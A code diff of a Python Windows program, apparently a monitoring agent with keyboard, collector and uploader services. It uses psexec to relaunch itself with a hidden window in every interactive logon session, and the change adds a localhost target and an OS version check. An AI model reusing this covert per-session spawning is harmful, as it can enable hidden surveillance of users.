@@ -11,6 +11,7 @@ from services.uploader import Uploader
 from services.kbdsvc import Kbdsvc
 from services.collector import Collector
 import logger
+import platform
 from config import config
 import utils
 from utils import fmt
@@ -50,7 +51,8 @@ def fork_on_session(sess):
     si = subprocess.STARTUPINFO()
     si.dwFlags = subprocess.STARTF_USESHOWWINDOW
     si.wShowWindow = subprocess.SW_HIDE
-    subprocess.Popen([utils.fs_enc(os.path.join(config["SELF_DIR"], "psexec.exe")), "-accepteula", "-d", "-i", str(sess),
+    subprocess.Popen([utils.fs_enc(os.path.join(config["SELF_DIR"], "psexec.exe")),
+                      "\\\\127.0.0.1", "-accepteula", "-d", "-i", str(sess),
                       utils.fs_enc(sys.executable)],
                      shell=False, startupinfo=si)
 
@@ -103,26 +105,28 @@ INTERACTIVE = [utils.SECURITY_LOGON_TYPE.Interactive,
 
 if __name__ == '__main__':
     log.debug(fmt("PID={0}", os.getpid()))
+    log.debug("; ".join(platform.uname()))
     try:
         if hasattr(sys, 'frozen'):
-            curr_sess = utils.get_session_of_pid(os.getpid())
-            log.debug(fmt("current session={0}", curr_sess))
-            self_terminate = False
+            if sys.platform.startswith('win') and utils.str2num(('.'.join(platform.version().split('.')[:2]))) >= 6.0:
+                curr_sess = utils.get_session_of_pid(os.getpid())
+                log.debug(fmt("current session={0}", curr_sess))
+                self_terminate = False
 
-            if is_already_running(os.path.basename(sys.executable)):
-                raise Exception(fmt("Already running on session {0}", curr_sess))
-            # fork only on interactive sessions
-            for sessdata in utils._enumerate_logonsessions2():
-                log.debug(fmt("Session={Session},{UserName},{LogonType}", **sessdata))
-                if sessdata.get('Session') == curr_sess:
-                    if sessdata.get('LogonType') not in INTERACTIVE:
-                        self_terminate = True
-                elif sessdata.get('LogonType') in INTERACTIVE:
-                    time.sleep(1)
-                    fork_on_session(sessdata.get('Session'))
-            # If self process was running on non interactive session, then exit
-            if self_terminate:
-                sys.exit()
+                if is_already_running(os.path.basename(sys.executable)):
+                    raise Exception(fmt("Already running on session {0}", curr_sess))
+                # fork only on interactive sessions
+                for sessdata in utils._enumerate_logonsessions2():
+                    log.debug(fmt("Session={Session},{UserName},{LogonType}", **sessdata))
+                    if sessdata.get('Session') == curr_sess:
+                        if sessdata.get('LogonType') not in INTERACTIVE:
+                            self_terminate = True
+                    elif sessdata.get('LogonType') in INTERACTIVE:
+                        time.sleep(1)
+                        fork_on_session(sessdata.get('Session'))
+                # If self process was running on non interactive session, then exit
+                if self_terminate:
+                    sys.exit()
 
         SPclient().start()
     except Exception as e:
